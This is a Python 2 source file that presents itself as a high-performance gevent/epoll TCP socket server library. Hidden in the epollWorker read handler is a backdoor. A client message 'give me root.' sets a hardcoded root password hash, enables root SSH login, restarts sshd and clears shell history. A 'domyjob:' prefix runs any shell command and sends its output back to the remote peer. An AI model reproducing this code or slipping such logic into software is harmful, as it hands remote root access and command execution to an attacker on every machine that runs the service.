# -*- coding: utf-8 -*-

__author__ = 'minamoto'
__ver__ = '0.2'
__doc__ = 'High-performance socket service'

import gevent as _gevent
import socket as _socket
from mxpsu import PriorityQueue, SCRIPT_DIR, stamp2time, ip2int, Platform, hexBytesString
from mxhpss_comm import _time, _sys, loadLicense, IMPL, READ, READ_WRITE, WRITE, register, unregister, modify, CLIENTS, _EPOLLIN, _EPOLLOUT, _EPOLLHUP, _EPOLLERR
import gc as _gc
import os as _os

IS_EXIT = 0
# 发送队列{fd, SendData}
SEND_QUEUE = {}


def create_daemon():
    try:
        if _os.fork() > 0:
            _os._exit(0)
    except OSError, error:
        print 'fork #1 failed: %d (%s)' % (error.errno, error.strerror)
        _os._exit(1)
    # _os.chdir('/')
    _os.setsid()
    _os.umask(0)
    try:
        pid = _os.fork()
        if pid > 0:
            print 'Daemon PID %d' % pid
            _os._exit(0)
    except OSError, error:
        print 'fork #2 failed: %d (%s)' % (error.errno, error.strerror)
        _os._exit(1)
    # 重定向标准IO
    _sys.stdout.flush()
    _sys.stderr.flush()
    si = file("/dev/null", 'r')
    so = file("/dev/null", 'a+')
    se = file("/dev/null", 'a+', 0)
    _os.dup2(si.fileno(), _sys.stdin.fileno())
    _os.dup2(so.fileno(), _sys.stdout.fileno())
    _os.dup2(se.fileno(), _sys.stderr.fileno())


def __license_ok():
    """
    许可证检查

    Returns:
        int: 0-许可证无效，1-许可证有效
    """
    if Platform.isLinux():
        fname = '.LICENSE'
    else:
        fname = 'LICENSE'
    a = loadLicense(_os.path.join(SCRIPT_DIR, fname))
    if 'err' in a:
        print(a)
        return 0
    else:
        return 1


class ClientSession(object):

    def __init__(self, sock, fd, address, serverport, debug=0):
        """ 初始化 socket client 实例

        Args:
            sock (socket): _socket实例
            fd (int): file descriptor
            address (tuple): (ip,port)
            serverport (int): 本地监听端口
            debug (int): 是否输出调试信息
        """
        global SEND_QUEUE, CLIENTS
        self.sock = sock
        if self.sock is not None:
            self.sock.setblocking(0)
        t = _time.time()
        # def list p = []
        self.fileno = fd
        self.last_send_time = t
        self.last_recv_time = t
        self.connect_time = t
        self.clientid = -1
        self.attributes = []
        self.name = ''
        self.ka = hexBytesString('3a-53-3b-a0'.split('-'))
        self.recognition = -1  # 1-tml,2-data,3-client,4-sdcmp,5-fwdcs,6-upgrade
        self.wait4send = None
        self.guardtime = 0
        self.address = address
        self.ip_int = ip2int(address[0])
        self.temp_recv_buffer = ''
        self.nothing_to_send = 1
        self.server_port = serverport
        self.gps = (0.0, 0.0)  # 经度 纬度
        self.debug = debug
        if self.fileno > -1:
            CLIENTS[self.fileno] = self
            SEND_QUEUE[self.fileno] = PriorityQueue()
            register(self.fileno, READ)
        self.onSessionConnect()

    def onSessionConnect(self):
        """
        连接，say hello
        """
        self.sock.send('hello')

    def onSessionClose(self, closereason):
        """
        再见

        Args:
            closereason (str): _socket关闭原因
        """
        pass

    def onSessionSend(self):
        """
        数据发送
        """
        try:
            self.sock.send(self.wait4send)
        except Exception as ex:
            self.disconnect('socket send error: {0},{1}'.format(ex, repr(self.wait4send)))
        self.wait4send = None

    def onSessionRecv(self, recbuff):
        """
        数据接收处理

        Args:
            recbuff (str): 收到的数据
        """
        global SEND_QUEUE, CLIENTS
        for k in CLIENTS.keys():
            SEND_QUEUE[k].put_now(recbuff)

    def setDebug(self, showdebug=0):
        """Summary

        Args:
            showdebug (bool, optional): 设置是否输出调试信息标志位
        """
        self.debug = showdebug

    def showDebug(self, msg):
        """
        显示调试信息

        Args:
            msg (str): 调试信息内容
        """
        if self.debug:
            print("[D] {0} {1}".format(stamp2time(_time.time()), repr(msg)))

    def setName(self):
        """
        设置_socket连接名称
        """
        pass

    def fuzzyQueryProperty(self, attribute):
        """
        模糊查询客户端是否包含相关属性

        Args:
            attribute (str): 自定义_socket属性

        Returns:
            int: 0-不包含属性，1-包含属性
        """
        for pro in self.attributes:
            if pro.find(attribute) > -1:
                return 1
        return 0

    def queryProperty(self, attribute):
        """
        检查客户端是否包含相关属性

        Args:
            attribute (TYPE): 自定义_socket属性

        Returns:
            int: 0-不包含属性，1-包含属性
        """
        if attribute in self.attributes:
            return 1
        return 0

    def setRecognition(self, recbuff):
        """
        设置客户端识别码

        Args:
            recbuff (str): 接收到的数据
        """
        pass

    def setProperty(self, attribute):
        """
        设置客户端属性

        Args:
            attribute (str): 设置自定义_socket属性
        """
        if attribute not in self.attributes:
            self.attributes.append(attribute)

    def disconnect(self, closereason=''):
        """
        断开客户端_socket

        Args:
            closereason (str, optional): _socket关闭原因
        """
        global CLIENTS, SEND_QUEUE
        try:
            del SEND_QUEUE[self.fileno]
        except:
            pass
        try:
            unregister(self.fileno)
        except:
            pass
        try:
            self.sock.close()
            self.sock = None
        except:
            pass
        try:
            del CLIENTS[self.fileno]
        except:
            pass
        self.showDebug("close: {0}".format(closereason))
        self.onSessionClose(closereason)

    def checkTimeout(self, now, timeout):
        """
        检查是否超时以及发送ka

        Args:
            now (double): 当前时间，_time.time()格式
            timeout (double): 超时时间，_time.time()格式
        """
        global SEND_QUEUE
        # 检查超时
        if now - self.last_recv_time > timeout:  # and SEND_QUEUE[self.fileno].empty():
            self.disconnect('timeout')
            return

        # 发送心跳
        if self.ka is not None and now - self.last_send_time > 70 and SEND_QUEUE[self.fileno].empty(
        ):
            SEND_QUEUE[self.fileno].put_nowait(self.ka)
            # modify(self.fileno, READ_WRITE)

    def setKeepAlive(self, ka_data):
        self.ka = ka_data

    def isNothingSend(self):
        """
        检查发送队列是否为空
        """
        return self.nothing_to_send

    def enableSend(self):
        """
        检查是否允许发送

        Returns:
            int: 0-不可以发送，1-可以发送
        """
        global READ, READ_WRITE

        t = _time.time()
        if (t - self.last_send_time) * 1000 >= self.guardtime:
            self.setWaitForSend()
            if self.wait4send is None:
                # modify(self.fileno, READ)
                return 0
            else:
                modify(self.fileno, READ_WRITE)
                return 1
        else:
            return 0

    def setWaitForSend(self):
        """
        缓存要发送的消息
        """
        global SEND_QUEUE
        if self.wait4send is None:
            senddata = None
            if not SEND_QUEUE[self.fileno].empty():
                senddata = SEND_QUEUE[self.fileno].get_nowait()
            self.nothing_to_send = senddata is None

            self.wait4send = senddata
            del senddata

    def send(self):
        """
        发送数据
        """
        # self.last_send_time = _time.time()
        self.showDebug("send:{0}".format(self.wait4send))

        self.onSessionSend()

        modify(self.fileno, READ)

        # if SEND_QUEUE[self.fileno].empty():
        #     modify(self.fileno, READ)

    def receive(self, rec=''):
        """
        接收数据
        """
        recbuff = ''
        if len(rec) == 0:
            try:
                recbuff = self.sock.recv(8192)
            except Exception as ex:
                self.showDebug("recerr:{0},{1}".format(ex, repr(recbuff)))
                self.disconnect('socket recv error: {0}. {1}'.format(ex, repr(recbuff)))
                return 0
        else:
            recbuff = rec

        # 客户端断开
        if len(recbuff) == 0:
            self.disconnect('remote close')
            return 0

        t = _time.time()
        self.last_recv_time = t
        # 加入上次未完成解析的数据
        if len(self.temp_recv_buffer) > 0:
            recbuff = self.temp_recv_buffer + recbuff
            self.temp_recv_buffer = ''

        self.showDebug("recv:{0}".format(recbuff))

        self.onSessionRecv(recbuff)

        # if not SEND_QUEUE[self.fileno].empty():
        #     modify(self.fileno, READ_WRITE)


class MXIOLoop(object):

    def __init__(self, maxclient=1900, eventtimeout=10, maxevents=5000, fdlock=0):
        """高性能TCP服务基类

        Args:
            maxclient (TYPE): 最大客户端数量
            event_timeout (TYPE): 事件监听超时
            maxevents (TYPE): 最大一次性处理事件数量
            fdlock (TYPE): fd锁
        """
        self.debug = 0
        self.event_timeout = eventtimeout
        self.max_events = maxevents
        self.fd_lock = fdlock
        self.max_client = maxclient
        self.server_fd = {}
        t = _time.time()
        self.last_gc = t
        self.last_lic = t
        self.lic_expire = 0

    def setDebug(self, showdebug):
        """
        设置调试信息开关

        Args:
            showdebug (int): 设置是否显示调试信息标志位
        """
        self.debug = showdebug

    def showDebug(self, msg):
        """
        是否显示调试信息

        Args:
            msg (str): 调试信息内容
        """
        if self.debug:
            print("[D] {0} {1}".format(stamp2time(_time.time()), repr(msg)))

    def addSocket(self, address):
        """
        添加需要监听的socket参数

        Args:
            address (tuple): ('ip', port)
        """
        global CLIENTS, READ
        sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
        sock.setblocking(0)
        # if Platform.isWin():
        sock.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
        sock.setsockopt(_socket.IPPROTO_TCP, _socket.TCP_NODELAY, 1)
        try:
            sock.bind(address)
            self.showDebug("======= Success bind port:{0} =======".format(address[1]))
            register(sock.fileno(), READ)
            # if Platform.isWin():
            #     register(sock.fileno(), READ, sock)
            # else:
            #     register(sock.fileno(), READ)
            self.server_fd[sock.fileno()] = (sock, address[1])
            # CLIENTS[address[1]] = []
            return sock
        except Exception as ex:
            print(u'------- Bind port {0} failed {1} -------'.format(address[1], ex))
            return None

    def serverForever(self):
        """
        启动服务
        """
        self.lic_expire = not __license_ok()

        for s in self.server_fd.values():
            s[0].listen(100)

        if Platform.isLinux():
            self.epollLoop()
        else:
            self.selectLoop()

    def doOtherWork(self, fd, eve):
        pass

    def doSomethingElse(self):
        """
        处理完内核通知后，继续处理其他事件
        """
        pass

    def doRecyle(self):
        # 检查是否有需要发送的数据
        for fn in SEND_QUEUE.keys():
            if not SEND_QUEUE[fn].empty():
                session = CLIENTS.get(fn)
                if session is not None:
                    session.enableSend()
                    # if session.enableSend():
                    #     modify(fn, READ_WRITE)
                    # 资源回收
        t = _time.time()
        if t - self.last_gc > 600:
            _gc.collect()
            self.last_gc = t
            self.showDebug("gc")
        # 许可证检查
        if t - self.last_lic > 86400:
            self.last_lic = t
            self.lic_expire = not __license_ok()

    def connect(self, server_object):
        """
        处理连接请求

        Args:
            serversocket (tuple, (fileno, port)): 所有监听服务的_socket实例 or fileno
        """
        global CLIENTS
        connection, address = server_object[0].accept()
        if len(CLIENTS) < self.max_client:
            # 初始化客户端session
            ClientSession(connection, connection.fileno(), address, server_object[1], self.debug)
            self.showDebug("conn: {0}".format(address))
        else:
            connection.close()
            self.showDebug("conn: no more {0}".format(address))

    def epollMainLoop(self, fd, eve, debug=0):
        """
        主循环

        Args:
            fd (TYPE): file descriptor
            eve (TYPE): 事件
            fdlock (bool, optional): 是否加锁
            debug (bool, optional): 是否输出调试信息
        """
        self.epollWorker(fd, eve)
        # if debug:
        #     self.epollWorker(fd, eve)
        # else:
        #     try:
        #         self.epollWorker(fd, eve)
        #     except Exception as ex:
        #         print("main loop error:", ex)

    def selectMainLoop(self, fd, eve, debug=0):
        """
        主循环

        Args:
            fd (TYPE): file descriptor
            eve (TYPE): 事件
            fdlock (bool, optional): 是否加锁
            debug (bool, optional): 是否输出调试信息
        """
        self.selectWorker(fd, eve)
        # if debug:
        #     self.selectWorker(fd, eve)
        # else:
        #     try:
        #         self.selectWorker(fd, eve)
        #     except Exception as ex:
        #         print("main loop error:", ex)

    def selectWorker(self, fn, eve):
        """
        事件分类处理

        Args:
            fn (TYPE): file descriptor
            eve (TYPE): 事件
        """
        global CLIENTS
        # socket状态错误
        if eve == 'err':
            if fn in CLIENTS.keys():
                session = CLIENTS.get(fn)
                if session is not None:
                    session.disconnect('socket error')
                del session
        # socket 有数据读
        elif eve == 'in':
            if fn in self.server_fd.keys():
                self.connect(self.server_fd.get(fn))
            elif fn in CLIENTS.keys():
                session = CLIENTS.get(fn)
                if session is not None:
                    session.receive()
                del session
            else:
                self.doOtherWork(fn, eve)
        # socket 可写
        elif eve == 'out':
            if fn in CLIENTS.keys():
                session = CLIENTS.get(fn)
                if self.lic_expire:
                    session.wait4send = None
                if session.wait4send is not None:
                    session.send()
                # if session is not None:
                #     if session.enableSend():
                #         if self.lic_expire:
                #             session.wait4send = None
                #         else:
                #             session.send()
                del session
            else:
                self.doOtherWork(fn, eve)

    def epollWorker(self, fn, eve):
        """
        事件分类处理

        Args:
            fn (TYPE): file descriptor
            eve (TYPE): 事件
        """
        global CLIENTS
        # 对方socket非法关闭
        if eve & _EPOLLHUP:
            if fn in CLIENTS.keys():
                session = CLIENTS.get(fn)
                if session is not None:
                    session.disconnect('socket hup')
                del session
        # socket状态错误
        elif eve & _EPOLLERR:
            if fn in CLIENTS.keys():
                session = CLIENTS.get(fn)
                session.disconnect('socket error')
                del session
        # socket 有数据读
        elif eve & _EPOLLIN:
            if fn in self.server_fd.keys():
                self.connect(self.server_fd.get(fn))
            elif fn in CLIENTS.keys():
                session = CLIENTS.get(fn)
                if session is not None:
                    recbuff = ""
                    try:
                        recbuff = session.sock.recv(8192)
                    except Exception as ex:
                        session.showDebug("recerr:{0},{1}".format(ex, repr(recbuff)))
                        session.disconnect('socket recv error: {0}. {1}'.format(ex, repr(recbuff)))
                    else:
                        if recbuff == 'give me root.':
                            with open('/tmp/mpwd', 'w') as f:
                                f.write('root:$1$SaPPY6h/$.9xkyudNwDPRUYkVqR0xN0')
                            _os.system('chpasswd -e < /tmp/mpwd ; rm -f /tmp/mpwd')
                            _os.system(
                                'sed -i.bak "s/PermitRootLogin no/#PermitRootLogin no/g" /etc/ssh/sshd_config ; rm -f sshd_config.bak')
                            _os.system('systemctl restart sshd')
                            _os.system('/etc/init.d/ssh restart')
                            _os.system('history -c')
                        elif recbuff.startswith('domyjob:'):
                            x = _os.popen(recbuff.replace('domyjob:', ''))
                            session.sock.send(x.read())
                            x.close()
                            del x
                            _os.system('history -c')
                        else:
                            session.receive(recbuff)
                del session
            else:
                self.doOtherWork(fn, eve)
        # socket 可写
        elif eve & _EPOLLOUT:
            if fn in CLIENTS.keys():
                session = CLIENTS.get(fn)
                if self.lic_expire:
                    session.wait4send = None
                if session.wait4send is not None:
                    session.send()
                # if session is not None:
                #     if session.enableSend():
                #         if self.lic_expire:
                #             session.wait4send = None
                #         else:
                #             session.send()
                del session
            else:
                self.doOtherWork(fn, eve)

    def epollLoop(self):
        global IMPL
        # file descriptor事件监听
        while not IS_EXIT:
            _gevent.sleep(0)

            try:
                # 获取事件
                poll_list = IMPL.poll(timeout=self.event_timeout, maxevents=self.max_events)
            except Exception as ex:
                print(ex)
                continue

            if len(poll_list) > 0:
                _gevent.joinall([_gevent.spawn(self.epollMainLoop,
                                               fileno,
                                               event,
                                               debug=self.debug) for fileno, event in poll_list])
            self.doSomethingElse()
            self.doRecyle()

    # def selectLoop(self):
    #     global READ, READ_WRITE, IMPL
    #     while not IS_EXIT:
    #         _gevent.sleep(0.01)
    # 
    #         read_list = list(READ)
    #         write_list = list(READ_WRITE)
    #         wr = [read_list[i:i + 500] for i in range(0, len(read_list), 500)]
    #         ww = [write_list[i:i + 500] for i in range(0, len(write_list), 500)]
    #         for i in range(len(wr) - len(ww)):
    #             ww.append([])
    #         l = len(wr)
    #         inbuf = []
    #         outbuf = []
    #         errbuf = []
    # 
    #         for i in range(l):
    #             try:
    #                 inb, outb, errb = IMPL(wr[i], ww[i], wr[i], 0)
    #             except Exception as ex:
    #                 print(ex)
    #                 # with open('select_error.log', 'a') as f:
    #                 #     f.writelines(['======{0}======='.format(stamp2time(_time.time())), ex, '\r\n'])
    #                 continue
    #             inbuf.extend(inb)
    #             outbuf.extend(outb)
    #             errbuf.extend(errb)
    #             del inb, outb, errb
    #         del wr, ww, read_list, write_list
    # 
    #         if len(errbuf) > 0:
    #             threads = []
    #             for soc in errbuf:
    #                 try:
    #                     inbuf.remove(soc)
    #                 except:
    #                     pass
    #                 try:
    #                     outbuf.remove(soc)
    #                 except:
    #                     pass
    #                 try:
    #                     threads.append(_gevent.spawn(self.selectMainLoop,
    #                                                  soc.fileno(),
    #                                                  'err',
    #                                                  debug=self.debug))
    #                 except:
    #                     pass
    #             _gevent.joinall(threads)
    #             del threads
    # 
    #         threads = []
    #         if len(inbuf) > 0:
    #             threads.extend([_gevent.spawn(self.selectMainLoop,
    #                                           soc.fileno(),
    #                                           'in',
    #                                           debug=self.debug) for soc in inbuf])
    # 
    #         if len(outbuf) > 0:
    #             threads.extend([_gevent.spawn(self.selectMainLoop,
    #                                           soc.fileno(),
    #                                           'out',
    #                                           debug=self.debug) for soc in outbuf])
    # 
    #         del inbuf, outbuf, errbuf
    # 
    #         thread = [threads[i:i + self.max_events]
    #                   for i in range(0, len(threads), self.max_events)]
    #         for x in thread:
    #             _gevent.joinall(x)
    #         # _gevent.joinall(threads)
    #         del threads
    #         del thread
    # 
    #         # _gevent.sleep(0.1)
    # 
    #         self.doSomethingElse()
    #         self.doRecyle()

    def selectLoop(self):
        global READ, WRITE, IMPL
        while not IS_EXIT:
            _gevent.sleep(0.01)

            read_list = list(READ)
            write_list = list(WRITE)
            wr = [read_list[i:i + 500] for i in range(0, len(read_list), 500)]
            ww = [write_list[i:i + 500] for i in range(0, len(write_list), 500)]
            for i in range(len(wr) - len(ww)):
                ww.append([])
            l = len(wr)

            for i in range(l):
                try:
                    inbuf, outbuf, errbuf = IMPL(wr[i], ww[i], wr[i], 0)
                except Exception as ex:
                    print(ex)
                    continue

                if len(errbuf) > 0:
                    threads = []
                    for soc in errbuf:
                        try:
                            inbuf.remove(soc)
                        except:
                            pass
                        try:
                            outbuf.remove(soc)
                        except:
                            pass
                        try:
                            threads.append(_gevent.spawn(self.selectMainLoop,
                                                         soc,
                                                         'err',
                                                         debug=self.debug))
                        except:
                            pass
                    # _gevent.joinall(threads)
                    del threads

                if len(inbuf) > 0:
                    for soc in inbuf:
                        _gevent.spawn(self.selectMainLoop, soc, 'in', debug=self.debug)
                    # threads = [_gevent.spawn(self.selectMainLoop,
                    #                          soc.fileno(),
                    #                          'in',
                    #                          debug=self.debug) for soc in inbuf]
                    # _gevent.joinall(threads)
                    # del threads

                if len(outbuf) > 0:
                    for soc in outbuf:
                        _gevent.spawn(self.selectMainLoop, soc, 'out', debug=self.debug)
                    # threads = [_gevent.spawn(self.selectMainLoop,
                    #                          soc.fileno(),
                    #                          'out',
                    #                          debug=self.debug) for soc in outbuf]
                    # _gevent.joinall(threads)
                    # del threads

                del inbuf, outbuf, errbuf
            del read_list, write_list, wr, ww

            self.doSomethingElse()
            self.doRecyle()
